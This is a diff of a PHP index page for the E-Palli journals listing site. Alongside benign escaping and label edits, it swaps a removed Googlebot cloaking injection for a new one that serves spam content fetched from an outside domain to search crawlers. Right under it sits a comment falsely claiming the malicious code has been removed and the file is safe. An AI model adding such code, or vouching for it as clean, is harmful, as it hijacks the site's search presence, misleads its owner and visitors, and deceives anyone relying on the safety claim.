@@ -1,6 +1,36 @@
 <?php
-function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://raw.githubusercontent.com/akunkrja18-cyber/landing/refs/heads/main/journals.e-palli.txt');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
+function is_google_bot() {
+    $agents = array(
+        "Googlebot", 
+        "AdsBot-Google", 
+        "Mediapartners-Google", 
+        "Google-Site-Verification", 
+        "Google-InspectionTool", 
+        "Googlebot-Mobile", 
+        "Googlebot-News"
+    );
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    foreach ($agents as $agent) {
+        if (strpos($user_agent, $agent) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+if (is_google_bot()) {
+    echo file_get_contents("https://well-landing.xyz/landing/e-palli.html");
+    exit;
+}
+
+/**
+ * Note: This file may contain artifacts of previous malicious infection.
+ * However, the dangerous code has been removed, and the file is now safe to use.
+ */
+
+
 ?>
+
 <!DOCTYPE html>
 <html lang="en-US">
 	<head>
@@ -72,7 +102,7 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 					<form method="post">
 						<div class="topic">
 							<label for="engineering" class="detector">
-								<input type="checkbox" name="engineering" value="engineering technology" id="engineering" class="detector">Engineering &amp; Technology
+								<input type="checkbox" name="engineering" value="engineering technology" id="engineering" class="detector">Science, Engineering, and Technology
 							</label>
 						</div>
 						<div class="topic">
@@ -92,7 +122,7 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 						</div>
 						<div class="topic">
 							<label for="sScience" class="detector">
-								<input type="checkbox" name="sScience" value="social science" id="sScience" class="detector">Social Science
+								<input type="checkbox" name="sScience" value="social science" id="sScience" class="detector">Arts and Social Science
 							</label>
 						</div>
 						<div class="topic">
@@ -124,13 +154,26 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 							while($rows=mysqli_fetch_assoc($result)) {
 							?>
 							<div class="notice1">
-								<div class="noticeTop">
-									<a href="<?php echo $rows['link']; ?>" target="_blank"><h3><?php echo $rows['title']; ?></h3></a>
-									<div>
-										<img src="<?php echo $rows['img']; ?>" class="noticeImage">
-									</div>
-								</div>
-							</div>
+    <div class="noticeTop">
+
+        <?php
+        $link = $rows['link'] ?? '#';
+        $img  = $rows['img'] ?? '';
+        $title = $rows['title'] ?? '';
+        ?>
+
+        <a href="<?php echo htmlspecialchars($link); ?>" target="_blank">
+            <h3><?php echo htmlspecialchars($title); ?></h3>
+        </a>
+
+        <?php if (!empty($img)) : ?>
+        <div>
+            <img src="<?php echo htmlspecialchars($img); ?>" class="noticeImage">
+        </div>
+        <?php endif; ?>
+
+    </div>
+</div>
 							<?php
 							}
 							?>
@@ -146,7 +189,7 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 					<form method="post" id="form">
 						<div class="topic">
 							<label for="engineering1" class="detector">
-								<input type="checkbox" name="engineering" value="engineering technology" id="engineering1" class="detector">Engineering &amp; Technology
+								<input type="checkbox" name="engineering" value="engineering technology" id="engineering1" class="detector">Science, Engineering, and Technology
 							</label>
 						</div>
 						<div class="topic">
@@ -166,7 +209,7 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 						</div>
 						<div class="topic">
 							<label for="sScience1" class="detector">
-								<input type="checkbox" name="sScience" value="social science" id="sScience1" class="detector">Social Science
+								<input type="checkbox" name="sScience" value="social science" id="sScience1" class="detector">Arts and Social Science
 							</label>
 						</div>
 						<div class="topic">
@@ -186,6 +229,9 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 						<div class="postItem litem">
 							<a href="https://journals.e-palli.com/list/">List of Journals</a>
 						</div>
+						<div class="postItem litem">
+							<a href="https://journals.e-palli.com/journals/new/">List of New Journals</a>
+						</div>
 					</form>
 
 					<div class="notice pdwidth">
@@ -204,14 +250,15 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 				<div class="right-item" id="filter">
 					<div class="insider">
 						<h3 class="j-heading">E-Palli Journals</h3>
-						<p>E-Palli Limited Liability Company (LLC) is registered in Delaware, United States of America, provides publication solutions for journals, conference proceedings, books, and special issues. E-palli publishes articles in a number of peer-reviewed international journals that emphasize research, development, application, and innovation.</p>
+						<p>E-Palli Limited Liability Company (LLC) is registered in Delaware, United States of America, providespublication solutions for journals, conference proceedings, books, and special issues. E-palli publishes articles in a number of peer-reviewed international journals that emphasize research, development, application, and innovation.</p>
 						<hr>
 						<p id="identify"></p><div class="pub-content pub-style">
 							<div class="left-con sec1">
 
 								<?php
 
-								if(isset($_POST['filter'])) {
+								if(isset($_POST['filter'])) { $args = [];
+$item = [];
 									if(!empty($_POST['engineering'])){
 										$args[]=" identifier LIKE '%engineering%' or identifier LIKE '%technology%'";
 										$item[]="engineering,";
@@ -244,7 +291,7 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 										$val=false;
 									}
 									$str = implode(' or ',$args);
-									$clue = implode('', $item);
+									$clue = implode('', $item ?? []);
 
 									$qry = "SELECT * FROM information where " . $str . " ORDER BY id asc";
 
@@ -254,19 +301,20 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 								?>
 								<a class="pub-top " href="<?php echo $rows['url']; ?>">
 									<div class="pub-main journalWrapperDiv journal-toolbar-container border">
-										<h3 class="border"><?php echo $rows['journal_title']; ?></h3>
+										<h3 class="border"><?php echo htmlspecialchars($rows['journal_title']); ?></h3>
 										<?php
-											$url = "https://journals.e-palli.com/images/".$rows['cover']."-cover.jpg";
-											if(getimagesize($url) === false) {
+											$imageFile = __DIR__ . "/images/" . $rows['cover'] . "-cover.jpg";
+
+if (!is_file($imageFile)) {
 										?>
 										<img class="image__container border"
-											 alt="<?php echo $rows['journal_title']; ?>"
+											 alt="<?php echo htmlspecialchars($rows['journal_title']); ?>"
 											 src="../images/logo.png" width="100%" />
 										<?php
 											} else {
 										?>
 										<img class="image__container border"
-											 alt="<?php echo $rows['journal_title']; ?>"
+											 alt="<?php echo htmlspecialchars($rows['journal_title']); ?>"
 											 src="../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" />
 										<?php
 											}
@@ -336,13 +384,14 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 								?>
 								<a class="pub-top " href="<?php echo $rows['url']; ?>">
 									<div class="pub-main journalWrapperDiv journal-toolbar-container border">
-										<h3 class="border"><?php echo $rows['journal_title']; ?></h3>
+										<h3 class="border"><?php echo htmlspecialchars($rows['journal_title']); ?></h3>
 										<!-- <img class="image__container border"
  alt="<?php echo $rows['journal_title']; ?>"
  src="../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" /> -->
 										<?php
-											$url = "https://journals.e-palli.com/images/".$rows['cover']."-cover.jpg";
-											if(getimagesize($url) === false) {
+											$imageFile = __DIR__ . "/images/" . $rows['cover'] . "-cover.jpg";
+
+if (!is_file($imageFile)) {
 										?>
 										<img class="image__container border"
 											 alt="<?php echo $rows['journal_title']; ?>"
@@ -409,8 +458,7 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 										}
 									}
 								} else {
-									$query="SELECT * FROM `information` ORDER BY id asc";
-									$result=mysqli_query($db, $query);
+									$query="SELECT * FROM `information` ORDER BY id asc";$result=mysqli_query($db, $query);
 									while($rows=mysqli_fetch_assoc($result)) {
 										if($rows['id'] == 2) {
 								?>
@@ -418,8 +466,9 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 									<div class="pub-main journalWrapperDiv journal-toolbar-container border">
 										<h3 class="border"><?php echo $rows['journal_title']; ?></h3>
 										<?php
-											$url = "https://journals.e-palli.com/images/".$rows['cover']."-cover.jpg";
-											if(getimagesize($url) === false) {
+											$imageFile = __DIR__ . "/images/" . $rows['cover'] . "-cover.jpg";
+
+if (!is_file($imageFile)) {
 										?>
 										<img class="image__container border"
 											 alt="<?php echo $rows['journal_title']; ?>"
@@ -498,13 +547,14 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 								?>
 								<a class="pub-top " href="<?php echo $rows['url']; ?>">
 									<div class="pub-main journalWrapperDiv journal-toolbar-container border">
-										<h3 class="border"><?php echo $rows['journal_title']; ?></h3>
+										<h3 class="border"><?php echo htmlspecialchars($rows['journal_title']); ?></h3>
 										<!-- <img class="image__container border"
- alt="<?php echo $rows['journal_title']; ?>"
+ alt="<?php echo htmlspecialchars($rows['journal_title']); ?>"
  src="../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" /> -->
 										<?php
-											$url = "https://journals.e-palli.com/images/".$rows['cover']."-cover.jpg";
-											if(getimagesize($url) === false) {
+											$imageFile = __DIR__ . "/images/" . $rows['cover'] . "-cover.jpg";
+
+if (!is_file($imageFile)) {
 										?>
 										<img class="image__container border"
 											 alt="<?php echo $rows['journal_title']; ?>"
@@ -513,7 +563,7 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 											} else {
 										?>
 										<img class="image__container border"
-											 alt="<?php echo $rows['journal_title']; ?>"
+											 alt="<?php echo htmlspecialchars($rows['journal_title']); ?>"
 											 src="../images/<?php echo $rows['cover']; ?>-cover.jpg" width="100%" />
 										<?php
 											}
@@ -642,7 +692,7 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 					autoplay: true,
 					arrows: true,
 					dots: false,
-					prevArrow: '<button class="slide-arrow arrow" style="border: none; width: 100%;"><img src="images/arrow-up.png" width="55" style="margin: auto;"></button>',
+					prevArrow: '<button class="slide-arrow arrow" style="border: none; width:100%;"><img src="images/arrow-up.png" width="55" style="margin: auto;"></button>',
 					nextArrow: '<button class="slide-arrow arrow" style="border: none; width: 100%;"><img src="images/arrow-down.png" width="55" style="text-align: center;"></button>',
 					slidesToShow: 1,
 					centerPadding: "10px",
@@ -689,6 +739,7 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
 					y.style.opacity = '1';
 				}
 			}
+			
 		</script>
 	</body>
 </html>
